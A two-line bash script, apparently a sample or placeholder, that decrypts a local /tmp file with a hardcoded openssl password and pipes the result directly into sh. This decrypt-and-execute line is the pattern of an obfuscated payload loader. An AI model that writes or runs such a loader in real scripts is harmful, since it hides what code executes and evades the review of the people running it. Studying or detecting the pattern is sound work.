#!/bin/bash
openssl enc -d -aes-256-cbc -in /tmp/example_placeholder.enc -pass pass:AAAA | sh
